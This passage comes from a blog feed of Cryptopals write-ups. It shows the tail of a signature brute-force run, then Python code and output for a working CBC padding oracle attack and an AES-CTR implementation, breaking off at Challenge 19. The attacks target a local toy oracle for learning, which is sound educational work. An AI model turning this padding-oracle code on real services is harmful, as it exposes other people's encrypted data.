    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Brute force successful.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; Signature:&#34;</span>, signature)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Brute force failed.&#34;</span>)
</code></pre></div><p><code>&gt; Discovered signature: 8</code><br>
<code>&gt; Discovered signature: 8c</code><br>
<code>&gt; Discovered signature: 8c8</code><br>
<code>&gt; Discovered signature: 8c80</code><br>
<code>&gt; Discovered signature: 8c80a</code><br>
<code>&gt; Discovered signature: 8c80a9</code><br>
<code>&gt; Discovered signature: 8c80a95</code><br>
<code>&gt; Discovered signature: 8c80a95a</code><br>
<code>&gt; Discovered signature: 8c80a95a8</code><br>
<code>&gt; Discovered signature: 8c80a95a8e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e7</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e8</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e82</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a139245</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392455</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a139245533</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392455335</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a4</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a43</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e2</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e26</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267d</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267d8</code><br>
<code>&gt; Brute force successful.</code><br>
<code>&gt; Signature: 8c80a95a8e72b3e822a13924553351a433e267d8</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Set 3</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/23/set-3/</link>
            <pubDate>Mon, 23 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/23/set-3/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 17: The CBC padding oracle Link
 This is the best-known attack on modern block-cipher cryptography.
Combine your padding code and your CBC code to write two functions.
The first function should select at random one of the following 10 strings:
MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=
MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=
MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==
MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==
MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl
MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==
MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==
MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=
MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=
MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93
&amp;hellip; generate a random AES key (which it should save for all future encryptions), pad the string out to the 16-byte AES block size and CBC-encrypt it under that key, providing the caller the ciphertext and IV.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-17-the-cbc-padding-oracle">Challenge 17: The CBC padding oracle</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/17">Link</a></p>
<blockquote>
<p>This is the best-known attack on modern block-cipher cryptography.<br>
Combine your padding code and your CBC code to write two functions.<br>
The first function should select at random one of the following 10 strings:<br>
<strong>MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=</strong><br>
<strong>MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=</strong><br>
<strong>MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==</strong><br>
<strong>MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==</strong><br>
<strong>MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl</strong><br>
<strong>MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==</strong><br>
<strong>MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==</strong><br>
<strong>MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=</strong><br>
<strong>MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=</strong><br>
<strong>MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93</strong><br>
&hellip; generate a random AES key (which it should save for all future encryptions), pad the string out to the 16-byte AES block size and CBC-encrypt it under that key, providing the caller the ciphertext and IV.<br>
The second function should consume the ciphertext produced by the first function, decrypt it, check its padding, and return true or false depending on whether the padding is valid.<br>
It turns out that it&rsquo;s possible to decrypt the ciphertexts provided by the first function.<br>
The decryption here depends on a side-channel leak by the decryption function. The leak is the error message that the padding is valid or not.<br>
You can find 100 web pages on how this attack works, so I won&rsquo;t re-explain it. What I&rsquo;ll say is this:<br>
The fundamental insight behind this attack is that the byte 01h is valid padding, and occur in 1/256 trials of &ldquo;randomized&rdquo; plaintexts produced by decrypting a tampered ciphertext.<br>
02h in isolation is not valid padding.<br>
02h 02h is valid padding, but is much less likely to occur randomly than 01h.<br>
03h 03h 03h is even less likely.<br>
So you can assume that if you corrupt a decryption AND it had valid padding, you know what that padding byte is.<br>
It is easy to get tripped up on the fact that CBC plaintexts are &ldquo;padded&rdquo;. Padding oracles have nothing to do with the actual padding on a CBC plaintext. It&rsquo;s an attack that targets a specific bit of code that handles decryption. You can mount a padding oracle on any CBC block, whether it&rsquo;s padded or not.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES

<span style="color:#75715e"># Given</span>
b64_strings <span style="color:#f92672">=</span> [
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=&#39;</span>,
    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93&#39;</span>,
]
</code></pre></div><p>The first function:</p>
<ul>
<li>Selects a random base64 encoded given string.</li>
<li>Pad the string to block size.</li>
<li>CBC encrypts the chosen string under the key.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptor</span>(IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> (bytes, bytes):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Chose a random base64 encoded string and encrypt via AES CBC Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    index <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(b64_strings)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
    selected_string <span style="color:#f92672">=</span> b64_strings[index]
    ciphertext <span style="color:#f92672">=</span> AES_CBC_encrypt(selected_string, IV, key)
    <span style="color:#66d9ef">return</span> selected_string, ciphertext
</code></pre></div><p>The second function:</p>
<ul>
<li>Decrypts the given ciphertext.</li>
<li>Verify the decrypted string&rsquo;s padding.</li>
<li>Returns true or false based on validity of padding.</li>
</ul>
<p>NOTE: The specifications of this function are to be paid attention to, specifically the last one. The attack is only possible if the oracle gives a feedback on the padding of the plaintext encrypted being valid.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryptor</span>(ciphertext: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypt the given ciphertext via AES CBC Mode and check if padding is valid.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    plaintext <span style="color:#f92672">=</span> AES_CBC_decrypt(ciphertext, IV, key)
    <span style="color:#66d9ef">if</span> PKCS7_padded(plaintext):
        <span style="color:#66d9ef">return</span> True
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> False
</code></pre></div><p><img src="/Cryptopals_Set_3/image.png" alt="&ldquo;cbc_decryption&rdquo;">
<em>AES CBC Decryption.</em></p>
<p>The philosophy for the padding attack stems from the design of the CBC encryption mechanism. The ciphertext from the previous block is xored with the intermediate state of the next block formed during it&rsquo;s decryption. Since we have control over the ciphertext, maybe we can manipulate the blocks in some way into giving us some sort of indication towards it&rsquo;s effectiveness.</p>
<p><img src="/Cryptopals_Set_3/1_image.png" alt="&ldquo;xor_pad&rdquo;">
<em>Xoring the bytes to get valid padding.</em></p>
<p>The idea of the padding oracle attack is as follows:</p>
<p>We want to modify the last byte <code>X</code> of the second-to-last block so that the CBC decryption of the last block which has <code>?</code> as its content yields <code>0x01</code> instead. This of course works because CBC decrypts as: </p>
<p>Mⁱ = Decrypt(Cⁱ) ⊕ Cⁱᐨ¹</p>
<p>Finding the right <code>X</code> is achieved by querying all 256 values to the padding oracle to which you should only get one positive response (when you hit the correct plaintext guess or accidently hit a longer padding).</p>
<p>When we&rsquo;ve guessed this byte and move on to the next byte, the byte in focus can be deciphered the same way, while the byte we already discovered(the last byte of the block) can be xored with a value that converts the last byte of the plaintext in line with the requirement (say, we decipher the last byte as ‘A’, and since it&rsquo;s the second last byte in focus, we have to convert it into ‘\x02’. We simply put in the last byte of the previous block as something that would give us the plaintext&rsquo;s last byte&rsquo;s value to be ‘\x02’ after all the xoring.</p>
<p>The execution of the attack is in two parts, the first part being the modification of the previous cipher block and the second being the brute forcing, and are complimentary to each other.</p>
<p>Part 1:</p>
<p>We create a function to modify the (i-1)th cipherblock according to what the value of the padding byte has to be. The block to be modified is provided(treated as the IV) along with the plaintext already deciphered, padding of length we&rsquo;re at(gives away the index of the byte we&rsquo;re guessing, since we have to get the padding valid for the number of bytes guessed correctly already + 1) and of course, the byte we think is the one for us(the guessed byte).</p>
<p>The block is modified as follows:</p>
<ol>
<li>The IV remains as is until (length of the block - padding length). This is because these bytes aren&rsquo;t the focus yet, and could have any value for that matter.</li>
<li>We then add our guessed byte. This is the one we think will get us the right padding.</li>
<li>Followed by appending the bytes that would definitely generate the bytes corresponding to the padding length, since a block requiring a padding of N bytes is padding with the byte ‘\xN&rsquo; ( following the norms of PKCS7).</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify_block</span>(IV: bytes, guessed_byte: bytes, padding_len: int, found_plaintext: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Creates a forced block of the ciphertext, ideally to be given as IV to decrypt the following block.
</span><span style="color:#e6db74">    The forced IV will be used for the attack on the padding oracle CBC encryption.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    block_size <span style="color:#f92672">=</span> len(IV)

    <span style="color:#75715e"># Get the index of the first character of the padding.</span>
    index_of_forced_char <span style="color:#f92672">=</span> len(IV) <span style="color:#f92672">-</span> padding_len

    <span style="color:#75715e"># Using the guessed byte given as input, try to force the first character of the</span>
    <span style="color:#75715e"># padding to be equal to the length of the padding itself.</span>
    forced_character <span style="color:#f92672">=</span> IV[index_of_forced_char] <span style="color:#f92672">^</span> guessed_byte <span style="color:#f92672">^</span> padding_len

    <span style="color:#75715e"># Form the forced ciphertext by adding to it the forced character...</span>
    output <span style="color:#f92672">=</span> IV[:index_of_forced_char] <span style="color:#f92672">+</span> bytes([forced_character])

    <span style="color:#75715e"># ...and the characters that were forced before (for which we already know the plaintext).</span>
    m <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(block_size <span style="color:#f92672">-</span> padding_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, block_size):

        <span style="color:#75715e"># Force each of the following characters of the IV so that the matching characters in</span>
        <span style="color:#75715e"># the following block will be decrypted to &#34;padding_len&#34;.</span>
        forced_character <span style="color:#f92672">=</span> IV[k] <span style="color:#f92672">^</span> ord(found_plaintext[m]) <span style="color:#f92672">^</span> padding_len
        output <span style="color:#f92672">+=</span> bytes([forced_character])
        m <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>

    <span style="color:#66d9ef">return</span> output
</code></pre></div><p>Part 2:</p>
<p>The exploiting function goes over the ciphertext, block by block. During the processing of each block, it goes over every byte. This happens with the aid of the <code>modify_block</code> function we saw earlier. </p>
<p>We append the IV to the ciphertext and start verifying the padding of the ciphertext by working with only two blocks at a time, the first one taking place of the (i-1)th block(treated as an IV since only two blocks exist), and the second one taking the place of the ith block(the one we&rsquo;re trying to decrypt and verify the padding for). The first block is modified so as to yield a valid padding when the next block is decrypted. Since we do not know against which byte would obtain the valid padding, we resort to the brute force approach. We go over all 256 values for the byte in focus, modify the block every time and check if the decrypted plaintext has a valid padding. The moment it does, bingo. That&rsquo;s our byte. We then move onto the next byte, and then the next block, and then gradually, we have the whole plaintext deciphered right in front of our eyes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cbc_padding_attack</span>(ciphertext: bytes, IV: bytes, key: bytes, decryptor: callable) <span style="color:#f92672">-&gt;</span> bytes:

    block_size <span style="color:#f92672">=</span> len(IV)
    
    <span style="color:#75715e"># Create ciphertext blocks, with IV prepended to the ciphertexts.</span>
    <span style="color:#75715e"># The prepended IV enables us to decrypt the first block of ciphertext.</span>
    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    num_blocks <span style="color:#f92672">=</span> len(ciphertext)<span style="color:#f92672">//</span>block_size
    ciphertext_blocks <span style="color:#f92672">=</span> [IV] <span style="color:#f92672">+</span> [ciphertext[i:i<span style="color:#f92672">+</span>block_size] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ciphertext), block_size)]
    
    <span style="color:#75715e"># This loop goes over the cipher blocks.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, num_blocks<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
        plain_block <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        base_block <span style="color:#f92672">=</span> ciphertext_blocks[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] 
        target_block <span style="color:#f92672">=</span> ciphertext_blocks[i]
                
        <span style="color:#75715e"># This loop goes over every byte in a block.</span>
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, block_size<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
            possible_last_bytes <span style="color:#f92672">=</span> []
            <span style="color:#75715e"># This loop goes over all possible values for a byte.</span>
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
                
                mod_block <span style="color:#f92672">=</span> modify_block(base_block, k, j, plain_block)                
                check <span style="color:#f92672">=</span> decryptor(target_block, mod_block, key)
                <span style="color:#75715e"># Make a list of all values that satisfy the padding.</span>
                <span style="color:#66d9ef">if</span> check <span style="color:#f92672">==</span> True:
                    possible_last_bytes <span style="color:#f92672">+=</span> bytes([k])
                
            <span style="color:#75715e"># If more than one possible bytes have been found, then verify their validity by checking the next byte.</span>
            <span style="color:#66d9ef">if</span> len(possible_last_bytes) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
                <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> possible_last_bytes:
                    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
                        
                        mod_block <span style="color:#f92672">=</span> modify_block(base_block, k, j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, chr(byte)<span style="color:#f92672">+</span>plain_block)                
                        
                        check <span style="color:#f92672">=</span> decryptor(target_block, mod_block, key)
                        <span style="color:#66d9ef">if</span> check <span style="color:#f92672">==</span> True:
                            possible_last_bytes <span style="color:#f92672">=</span> [byte]
                            <span style="color:#66d9ef">break</span>
            <span style="color:#75715e"># Append the decrypted byte to the plain block.                </span>
            plain_block <span style="color:#f92672">=</span> chr(possible_last_bytes[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> plain_block
        <span style="color:#75715e"># Append the decrypted block to plaintext.</span>
        plaintext <span style="color:#f92672">+=</span> plain_block
    
    <span style="color:#66d9ef">return</span> PKCS7_unpad(plaintext<span style="color:#f92672">.</span>encode())
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>block_size
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(keysize)
IV <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(keysize)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">selected_string, ciphertext <span style="color:#f92672">=</span> encryptor(IV, random_key)
plaintext <span style="color:#f92672">=</span> cbc_padding_attack(ciphertext, IV, random_key, decryptor)
result <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(plaintext)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
result
</code></pre></div><p><code>&quot;000001With the bass kicked in and the Vega's are pumpin'&quot;</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-18-implement-ctr-the-stream-cipher-mode">Challenge 18: Implement CTR, the stream cipher mode</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/18">Link</a></p>
<blockquote>
<p>The string:<br>
<strong>L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==</strong> &hellip; decrypts to something approximating English in CTR mode, which is an AES block cipher mode that turns AES into a stream cipher, with the following parameters:<br>
** key=YELLOW SUBMARINE<br>
nonce=0<br>
format=64 bit unsigned little endian nonce,<br>
64 bit little endian block count (byte count / 16)<br>
** CTR mode is very simple.<br>
Instead of encrypting the plaintext, CTR mode encrypts a running counter, producing a 16 byte block of keystream, which is XOR&rsquo;d against the plaintext.<br>
For instance, for the first 16 bytes of a message with these parameters:<br>
<strong>keystream = AES(&ldquo;YELLOW SUBMARINE&rdquo;,</strong><br>
<strong>&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&rdquo;)</strong><br>
&hellip; for the next 16 bytes:<br>
<strong>keystream = AES(&ldquo;YELLOW SUBMARINE&rdquo;, &ldquo;\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&rdquo;)</strong><br>
&hellip; and then:<br>
<strong>keystream = AES(&ldquo;YELLOW SUBMARINE&rdquo;,</strong><br>
<strong>&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&rdquo;)</strong><br>
CTR mode does not require padding; when you run out of plaintext, you just stop XOR&rsquo;ing keystream and stop generating keystream.<br>
Decryption is identical to encryption. Generate the same keystream, XOR, and recover the plaintext.<br>
Decrypt the string at the top of this function, then use your CTR function to encrypt and decrypt other things.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> base64

<span style="color:#75715e"># Given</span>
b64_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==&#34;</span>
key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YELLOW SUBMARINE&#34;</span>
nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</code></pre></div><p>The third AES Mode is the <strong>CTR</strong> (<strong>Counter</strong>) Mode. It uses a keystream to encrypt/decrypt, turning block cipher into a stream cipher. </p>
<p><img src="/Cryptopals_Set_3/5_image.png" alt="&ldquo;AES_CTR">
<em>Keystream blocks being generated.</em></p>
<p>This keystream is generated block at a time, by appending a nonce value, and a counter that is being incremented at every call to it. The counter can be any function which produces a sequence which is guaranteed not to repeat for a long time, although an actual increment-by-one counter is the simplest and most popular.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">CTR_keystream_generator</span>(key: bytes, nonce: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Generates keystream based on given key and nonce.
</span><span style="color:#e6db74">    Uses AES ECB Mode to encrypt the nonce+counter block.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#75715e"># 8 byte because format says 64bit.</span>
    nonce_bytes <span style="color:#f92672">=</span> nonce<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;little&#34;</span>)
    
    <span style="color:#66d9ef">while</span> True:
        counter_bytes <span style="color:#f92672">=</span> counter<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;little&#34;</span>)
        <span style="color:#75715e"># Keep getting 16byte block from the encryption function.</span>
        keystream_block <span style="color:#f92672">=</span> AES_ECB_encrypt(nonce_bytes <span style="color:#f92672">+</span> counter_bytes, key)
        <span style="color:#66d9ef">yield</span> <span style="color:#f92672">from</span> keystream_block
        counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><p><img src="/Cryptopals_Set_3/2_image.png" alt="&ldquo;AES_CTR_encryption&rdquo;">
<em>AES CTR Encryption.</em></p>
<p>The encryption process involves encrypting the keystream block with a different block cipher encrypting technique and xoring it with plaintext to generate ciphertext.</p>
<p><img src="/Cryptopals_Set_3/3_image.png" alt="&ldquo;AES_CTR_decryption&rdquo;">
<em>AES CTR Decryption.</em></p>
<p>The decryption process can be stated as a mirror of the encryption process. It again encrypts the keystream block with the same block cipher encrypting technique as was used during encryption, and then xoring the ciphertext with it to receive the plaintext back.</p>
<p>It&rsquo;s clearly a play on one of the crucial properties of the xor operation: it&rsquo;s reversible.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">CTR</span>(string: bytes, key: bytes, nonce: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Encrypts a plaintext with AES CTR Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#75715e"># Generate the keystream based on key and nonce.</span>
    keystream <span style="color:#f92672">=</span> CTR_keystream_generator(key, nonce)
    
    <span style="color:#66d9ef">if</span> len(string) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> xor_bytes(string, keystream)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">decoded_string <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_string)
byte_text <span style="color:#f92672">=</span> CTR(decoded_string, key<span style="color:#f92672">.</span>encode(), <span style="color:#ae81ff">0</span>)
byte_text<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</code></pre></div><p><code>&quot;Yo, VIP Let's kick it Ice, Ice, baby Ice, Ice, baby &quot;</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<p>I came up with the solution for #19 involving scoring texts based on letter frequency, and it turned out to be the solution for #20 too.</p>
<h3 id="challenge-19-break-fixed-nonce-ctr-mode-using-substitutions">Challenge 19: Break fixed-nonce CTR mode using substitutions</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/19">Link</a></p>
<blockquote>
<p>Take your CTR encrypt/decrypt function and fix its nonce value to 0. Generate a random AES key.<br>
